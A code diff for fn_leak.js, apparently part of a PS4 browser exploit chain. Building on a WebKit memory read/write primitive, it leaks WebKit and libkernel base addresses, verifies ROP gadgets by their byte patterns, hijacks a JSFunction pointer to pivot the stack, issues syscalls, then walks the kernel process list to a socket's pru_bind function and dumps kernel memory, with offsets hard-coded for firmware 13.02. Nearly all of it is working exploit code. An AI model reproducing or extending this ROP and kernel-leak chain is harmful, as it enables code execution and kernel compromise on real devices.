@@ -1,3 +1,20 @@
+// fn_leak.js -- walk to pru_bind via the SSV primitive from core.js
+//
+// Requires:
+//   ./core.js        exports establishPrimitive
+//   ./int64.js       exports int64 { low, hi, add32, sub32 }
+//   ./ps4_offsets.js exports offsetsFor(userAgent) -> { key, off }
+//
+// URL params (all optional; core.js defaults are the working config):
+//   ?slots=N              carrier slots (default 4000000)
+//   ?g=drain:N            drain count (default 256)
+//   ?g=drainsz:0xN        drain size  (default 0x2000)
+//   ?g=slab:0xN           slab size   (default 0x800000)
+//   ?g=pred:0xN           predecessor (default 0xa0000)
+//
+// One cold boot per attempt. maxAttempts is 1 by design -- retries in
+// the same renderer reuse the previous attempt's heap and fail.
+
 import { establishPrimitive } from "./core.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
@@ -27,10 +44,11 @@ function mark(tag, detail) {
     if (typeof console !== "undefined") console.log(line);
     if (outEl) {
         outEl.innerHTML = lines.map(l =>
-        l.replace(/&/g, "&amp;").replace(/</g, "&lt;")).join("\n");
+            l.replace(/&/g, "&amp;").replace(/</g, "&lt;")).join("\n");
         outEl.scrollTop = outEl.scrollHeight;
     }
 }
+
 function markColdBoot(reason) {
     if (coldBootNeeded) return;
     coldBootNeeded = true;
@@ -39,9 +57,11 @@ function markColdBoot(reason) {
          + " -- close browser completely (not just the tab), "
          + "power-cycle the PS4, then reopen");
 }
+
 function hx8(x)  { return ("0" + ((x >>> 0) & 0xff).toString(16)).slice(-2); }
 function hx32(x) { return ("00000000" + ((x >>> 0).toString(16))).slice(-8); }
-// FIXED: int64 stores .low (three letters), not .lo
+
+// int64 stores the low half as .low (three letters). Not .lo.
 function phex(v) { return "0x" + hx32(v.hi) + hx32(v.low); }
 function zero(v) { return ((v.low >>> 0) === 0) && ((v.hi >>> 0) === 0); }
 
@@ -51,9 +71,7 @@ function numToI64(n) {
     const lo = (n - hi * 0x100000000) >>> 0;
     return new int64(lo, hi);
 }
-// FIXED: .low
 function i64ToNum(v) { return (v.hi >>> 0) * 0x100000000 + (v.low >>> 0); }
-function asI64(x)    { return (x instanceof int64) ? x : numToI64(x); }
 
 const SYS = { socket: 0x61, close: 6, getpid: 20, getuid: 0x18 };
 const AF_UNIX = 1, SOCK_STREAM = 1, AF_INET6 = 28;
@@ -61,14 +79,14 @@ const AF_UNIX = 1, SOCK_STREAM = 1, AF_INET6 = 28;
 window.addEventListener("error", (ev) => {
     if (isMemoryError(ev && ev.error ? ev.error : ev && ev.message)) {
         markColdBoot("window-error:" + (ev.message || "unknown"));
-        try { stateEl.textContent = "cold-boot-required"; } catch {}
+        try { stateEl.textContent = "cold-boot-required"; } catch (e) { }
     }
 });
 window.addEventListener("unhandledrejection", (ev) => {
     if (isMemoryError(ev && ev.reason)) {
         markColdBoot("unhandled-rejection:" + (ev.reason && ev.reason.message
-        ? ev.reason.message : String(ev.reason)));
-        try { stateEl.textContent = "cold-boot-required"; } catch {}
+            ? ev.reason.message : String(ev.reason)));
+        try { stateEl.textContent = "cold-boot-required"; } catch (e) { }
     }
 });
 
@@ -127,17 +145,16 @@ window.addEventListener("unhandledrejection", (ev) => {
         }
         function read4(a) {
             const b = readBytesAt(a, 4);
-            return (b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24)) >>> 0;
+            return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
         }
         function read8(a) {
             const b = readBytesAt(a, 8);
-            const lo = (b[0] | (b[1]<<8) | (b[2]<<16) | (b[3]<<24)) >>> 0;
-            const hi = (b[4] | (b[5]<<8) | (b[6]<<16) | (b[7]<<24)) >>> 0;
+            const lo = (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
+            const hi = (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0;
             return new int64(lo, hi);
         }
         function write8(a, v) {
             const addrNum = (typeof a === "number") ? a : i64ToNum(a);
-            // FIXED: .low
             const lo = (typeof v === "number") ? (v >>> 0) : (v.low >>> 0);
             const hi = (typeof v === "number") ? (v < 0 ? 0xffffffff : 0) : (v.hi >>> 0);
             carrier.aim(addrNum);
@@ -159,22 +176,22 @@ window.addEventListener("unhandledrejection", (ev) => {
         }
         p = { read1, read2, read4, read8, write8, leakval };
 
-        // ============================================================
-
+        // ---- bases -----------------------------------------------------
         const cell = p.leakval(Math.expm1);
         mark("CELL", phex(cell));
 
         const nativeFn = p.read8(p.read8(cell.add32(0x18))
-        .add32(off.wk_JSFunction_m_function));
+            .add32(off.wk_JSFunction_m_function));
         const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-        const errorFn    = p.read8(webkitBase.add32(off.wk___imp___error));
+        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
         const libkernelBase = errorFn.sub32(off.k__error);
         mark("BASES", "webkit=" + phex(webkitBase)
-        + " libkernel=" + phex(libkernelBase));
+            + " libkernel=" + phex(libkernelBase));
 
+        // ---- KBASE probe ------------------------------------------------
         {
             const rawKB = (params.get("kbase") || "0xffffffff80000000")
-            .replace(/^0x/i, "").padStart(16, "0");
+                .replace(/^0x/i, "").padStart(16, "0");
             const KB = new int64(parseInt(rawKB.slice(8), 16) >>> 0,
                                  parseInt(rawKB.slice(0, 8), 16) >>> 0);
             const head = readBytesAt(KB, 16);
@@ -183,6 +200,7 @@ window.addEventListener("unhandledrejection", (ev) => {
             mark("KBASE-PROBE", phex(KB) + " head=" + hdr.join(" "));
         }
 
+        // ---- gadgets ----------------------------------------------------
         const G = {};
         const GAD = [
             ["POP_RDI_RET",        off.wk_POP_RDI_RET,        [0x5f, 0xc3]],
@@ -194,19 +212,19 @@ window.addEventListener("unhandledrejection", (ev) => {
             ["POP_RAX_RET",        off.wk_POP_RAX_RET,        [0x58, 0xc3]],
             ["LEAVE_RET",          off.wk_LEAVE_RET,          [0xc9, 0xc3]],
             ["MOV_RDI_RAX_RET",    off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
-            [0x48, 0x89, 0x07, 0xc3]],
+                                   [0x48, 0x89, 0x07, 0xc3]],
             ["G0",                 off.wk_MOV_RDI_RSI_30_CALL,
-            [0x48, 0x8b, 0x7e, 0x30]],
+                                   [0x48, 0x8b, 0x7e, 0x30]],
             ["G1",                 off.wk_POP_RAX_MOV_RAX_JMP_18,
-            [0x58, 0x48, 0x8b, 0x07]],
+                                   [0x58, 0x48, 0x8b, 0x07]],
             ["G2",                 off.wk_PUSH_RBP_MOV_RBP_RSP_10,
-            [0x55, 0x48, 0x89, 0xe5]],
+                                   [0x55, 0x48, 0x89, 0xe5]],
             ["G3",                 off.wk_MOV_RDI_RAX_8_CALL_20,
-            [0x48, 0x8b, 0x78, 0x08]],
+                                   [0x48, 0x8b, 0x78, 0x08]],
             ["G4",                 off.wk_MOV_RDX_RAX_18_CALL_10,
-            [0x48, 0x8b, 0x50, off.pivot_view_sp]],
+                                   [0x48, 0x8b, 0x50, off.pivot_view_sp]],
             ["G5",                 off.wk_PUSH_RDX_POP_RSP_RET,
-            [0x52, 0x5c, 0xc3]],
+                                   [0x52, 0x5c, 0xc3]],
         ];
         for (const [nm, rva, pat] of GAD) {
             const a = webkitBase.add32(rva);
@@ -220,6 +238,7 @@ window.addEventListener("unhandledrejection", (ev) => {
         }
         mark("GADGETS", "ok");
 
+        // ---- stubs ------------------------------------------------------
         const stubAddr = new Map();
         const kStubs = off.k_stubs || {};
         const wantStubs = [SYS.getpid, SYS.getuid, SYS.socket, SYS.close];
@@ -242,19 +261,19 @@ window.addEventListener("unhandledrejection", (ev) => {
             return;
         }
 
+        // ---- ROP harness ------------------------------------------------
         for (let i = 0; i < 8; ++i) { const t = new Uint8Array(0x1000); void t; }
 
         function bufAddr(ab) {
             const c = p.leakval(ab);
             return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
-            .add32(off.wk_ArrayBuffer_m_contents_m_data));
+                .add32(off.wk_ArrayBuffer_m_contents_m_data));
         }
         function put(dv, at, v) {
             if (typeof v === "number") {
                 dv.setUint32(at, v >>> 0, true);
                 dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
             } else {
-                // FIXED: .low
                 dv.setUint32(at, v.low >>> 0, true);
                 dv.setUint32(at + 4, v.hi >>> 0, true);
             }
@@ -267,8 +286,8 @@ window.addEventListener("unhandledrejection", (ev) => {
         globalThis.__keep = keepAlive;
         const M = {
             storeDv: new DataView(sb), pivotDv: new DataView(pb),
- stackDv: new DataView(kb), frameDv: new DataView(fb),
- stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
+            stackDv: new DataView(kb), frameDv: new DataView(fb),
+            stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
         };
         M.S = bufAddr(sb); M.P = bufAddr(pb);
         M.K = bufAddr(kb); M.F = bufAddr(fb);
@@ -277,14 +296,14 @@ window.addEventListener("unhandledrejection", (ev) => {
         put(M.pivotDv, 0x00, M.P);  put(M.pivotDv, 0x10, G.G5);
         put(M.pivotDv, 0x20, G.G4);
 
-        mainMf   = p.read8(cell.add32(0x18))
-        .add32(off.wk_JSFunction_m_function);
+        mainMf = p.read8(cell.add32(0x18))
+            .add32(off.wk_JSFunction_m_function);
         mainOrig = p.read8(mainMf);
         p.write8(mainMf, G.G0);
         mainArmed = true;
 
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
-        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
+            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
         function layout(target, args) {
             M.stackU8.fill(0); M.frameU8.fill(0);
             const insts = [];
@@ -303,7 +322,7 @@ window.addEventListener("unhandledrejection", (ev) => {
                 put(M.stackDv, at + 8 * i, insts[i]);
             put(M.pivotDv, off.pivot_view_sp, M.K.add32(at));
         }
-        const pivotObj  = {};
+        const pivotObj = {};
         const pivotCell = p.leakval(pivotObj);
         function callAddr(target, args) {
             layout(target, args);
@@ -313,29 +332,32 @@ window.addEventListener("unhandledrejection", (ev) => {
             p.write8(pivotCell, saved);
             return {
                 lo:  M.frameDv.getUint32(0, true),
- hi:  M.frameDv.getUint32(4, true),
- i32: M.frameDv.getUint32(0, true) | 0
+                hi:  M.frameDv.getUint32(4, true),
+                i32: M.frameDv.getUint32(0, true) | 0
             };
         }
         const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
 
+        // ---- getpid / getuid -------------------------------------------
         const pid = sc(SYS.getpid).i32;
         mark("GETPID", String(pid));
         if (pid <= 0) {
             mark("FAIL", "getpid returned " + pid
-            + " -- stub offset for num=20 is wrong, or ROP is broken");
+                + " -- stub offset for num=20 is wrong, or ROP is broken");
             stateEl.textContent = "stub broken";
             return;
         }
         const uid = sc(SYS.getuid).i32;
         mark("GETUID", String(uid));
 
+        // ---- KBASE ------------------------------------------------------
         const rawKB = (params.get("kbase") || "0xffffffff80000000")
-        .replace(/^0x/i, "").padStart(16, "0");
+            .replace(/^0x/i, "").padStart(16, "0");
         const KBASE = new int64(parseInt(rawKB.slice(8), 16) >>> 0,
                                 parseInt(rawKB.slice(0, 8), 16) >>> 0);
         mark("KBASE", phex(KBASE));
 
+        // ---- socket() ---------------------------------------------------
         let sfd = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
         if (sfd === -1) {
             mark("NOTE", "AF_INET6 failed, trying AF_UNIX");
@@ -348,7 +370,8 @@ window.addEventListener("unhandledrejection", (ev) => {
         }
         mark("SOCKET", "fd=" + sfd);
 
-        const ALLPROC_RVA  = 0x01CA8538;
+        // ---- walk allproc -----------------------------------------------
+        const ALLPROC_RVA  = 0x01CA8538;   // 13.02 procinit-derived
         const ZOMBPROC_RVA = 0x01CA8540;
         const P_LIST_NEXT = 0x00, P_PID = 0xb0, P_FD = 0x48;
 
@@ -373,12 +396,13 @@ window.addEventListener("unhandledrejection", (ev) => {
         const ftype  = p.read2(filePtr.add32(0x20)) & 0xffff;
         const fcount = p.read4(filePtr.add32(0x28)) | 0;
         mark("FILE", phex(filePtr)
-        + " f_type=0x" + ftype.toString(16) + " f_count=" + fcount);
+            + " f_type=0x" + ftype.toString(16) + " f_count=" + fcount);
 
         const so = p.read8(filePtr.add32(0x00));
         if (zero(so)) { mark("FAIL", "f_data null"); return; }
         mark("SO", phex(so));
 
+        // ---- SO-DUMP ----------------------------------------------------
         {
             const blk = readBytesAt(so, 0x80);
             for (let i = 0; i < 0x80; i += 8) {
@@ -391,10 +415,12 @@ window.addEventListener("unhandledrejection", (ev) => {
             }
         }
 
+        // ---- so_proto ---------------------------------------------------
         const soProto = p.read8(so.add32(0x28));
         if (zero(soProto)) { mark("FAIL", "so_proto null (guessed +0x28)"); return; }
         mark("SO_PROTO", "A = " + phex(soProto));
 
+        // ---- A-DUMP -----------------------------------------------------
         {
             const blk = readBytesAt(soProto, 0x40);
             for (let i = 0; i < 0x40; i += 8) {
@@ -407,6 +433,7 @@ window.addEventListener("unhandledrejection", (ev) => {
             }
         }
 
+        // ---- pr_usrreqs -------------------------------------------------
         const pr = p.read8(soProto.add32(0x60));
         if (zero(pr)) { mark("FAIL", "pr_usrreqs null (guessed +0x60)"); return; }
         mark("PR_USRREQS", "B = " + phex(pr));
@@ -416,6 +443,7 @@ window.addEventListener("unhandledrejection", (ev) => {
              + " A=" + phex(soProto)
              + " B=" + phex(pr));
 
+        // ---- PRU table --------------------------------------------------
         const PRU = [
             ["pru_abort",       0x00], ["pru_accept",     0x08],
             ["pru_attach",      0x10], ["pru_bind",       0x18],
@@ -435,23 +463,25 @@ window.addEventListener("unhandledrejection", (ev) => {
                 for (let k = 0; k < 4; ++k) lo |= blk[o + k] << (8 * k);
                 for (let k = 0; k < 4; ++k) hi |= blk[o + 4 + k] << (8 * k);
                 mark("PRU", name.padEnd(16) + " = 0x"
-                + hx32(hi >>> 0) + hx32(lo >>> 0));
+                    + hx32(hi >>> 0) + hx32(lo >>> 0));
             }
         }
 
+        // ---- pru_bind ---------------------------------------------------
         const fn = p.read8(pr.add32(0x18));
         mark("FN", "pru_bind = " + phex(fn));
         mark("FN-HEAD", "fn=" + phex(fn));
 
-        // FIXED: .low on fn and KBASE
         const rvaLo = ((fn.low >>> 0) - (KBASE.low >>> 0)) >>> 0;
         const rvaHi = ((fn.hi >>> 0) - (KBASE.hi >>> 0)) >>> 0;
         mark("FN_RVA", "0x" + hx32(rvaHi) + hx32(rvaLo));
 
+        // ghidra VA = fn - kbase + image_base(0x680000)
         const ghidra = ((fn.low >>> 0) - (KBASE.low >>> 0) + 0x680000) >>> 0;
         mark("FN_HINT", "1302.elf.c  ->  FUN_"
-        + hx32(ghidra).replace(/^00+/, ""));
+            + hx32(ghidra).replace(/^00+/, ""));
 
+        // ---- FN_BYTES ---------------------------------------------------
         {
             const blk = readBytesAt(fn, 0x100);
             let dump = "";
